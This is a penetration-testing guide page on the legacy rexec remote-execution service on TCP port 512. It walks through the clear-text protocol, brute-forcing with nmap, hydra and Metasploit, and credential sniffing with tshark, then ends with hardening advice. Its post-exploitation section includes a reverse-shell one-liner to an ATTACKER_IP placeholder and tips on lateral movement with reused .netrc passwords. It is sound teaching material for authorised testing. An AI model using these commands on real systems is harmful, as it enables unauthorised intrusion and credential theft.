# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Basic Information

Rexec (remote **exec**) is one of the original Berkeley *r*-services suite (together with `rlogin`, `rsh`, â€¦).  It provides a **remote command-execution** capability **authenticated only with a clear-text username and password**.  The protocol was defined in the early 1980â€™s (see RFC 1060) and is nowadays considered **insecure by design**.  Nevertheless it is still enabled by default in some legacy UNIX / network-attached equipment and occasionally shows up during internal pentests.

**Default Port:** TCP 512 (`exec`)

```
PORT    STATE SERVICE
512/tcp open  exec
```

> ðŸ”¥  All traffic â€“ including credentials â€“ is transmitted **unencrypted**.  Anyone with the ability to sniff the network can recover the username, password and command.

### Protocol quick-look

1. Client connects to TCP 512.
2. Client sends three **NUL-terminated** strings:
   * the port number (as ASCII) where it wishes to receive stdout/stderr (often `0`),
   * the **username**,
   * the **password**.
3. A final NUL-terminated string with the **command** to execute is sent.
4. The server replies with a single 8-bit status byte (0 = success, `1` = failure) followed by the command output.

That means you can reproduce the exchange with nothing more than `echo -e` and `nc`:

```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```

If the credentials are valid you will receive the output of `id` straight back on the same connection.

### Manual usage with the client

Many Linux distributions still ship the legacy client inside the **inetutils-rexec** / **rsh-client** package:

```bash
rexec -l user -p password <target> "uname -a"
```

If `-p` is omitted the client will prompt interactively for the password (visible on the wire in clear-text!).

## Enumeration & Brute-forcing

### [**Brute-force**](../generic-hacking/brute-force.md#rexec)

### Nmap

```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
The `rexec-brute` NSE uses the protocol described above to try credentials very quickly .

### Hydra / Medusa / Ncrack

```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` has a dedicated **rexec** module and remains the fastest offline bruteforcer .  `medusa` (`-M REXEC`) and `ncrack` (`rexec` module) can be used in the same way.

### Metasploit

```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
The module will spawn a shell on success and store the credentials in the database .

## Sniffing credentials

Because everything is clear-text, **network captures are priceless**.  With a copy of the traffic you can extract creds without touching the target:

```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
  awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```

(In Wireshark enable *Decode As â€¦â€‹* TCP 512 â†’ REXEC to view nicely-parsed fields.)

## Post-Exploitation tips

* Commands run with the privileges of the supplied user.  If `/etc/pam.d/rexec` is mis-configured (e.g. `pam_rootok`), root shells are sometimes possible.
* Rexec ignores the userâ€™s shell and executes the command via `/bin/sh -c <cmd>`.  You can therefore use typical shell-escape tricks (`;`, ``$( )``, backticks) to chain multiple commands or spawn reverse shells:
  ```bash
  rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
  ```
* Passwords are often stored in **~/.netrc** on other systems; if you compromise one host you may reuse them for lateral movement.

---
## Hardening / Detection

* **Do not expose rexec**; replace it with SSH.  Virtually all modern *inetd* superservers comment the service out by default.
* If you must keep it, restrict access with TCP wrappers (`/etc/hosts.allow`) or firewall rules and enforce strong per-account passwords.
* Monitor for traffic to :512 and for `rexecd` process launches.  A single packet capture is enough to detect a compromise.
* Disable `rexec`, `rlogin`, `rsh` together â€“ they share most of the same codebase and weaknesses.
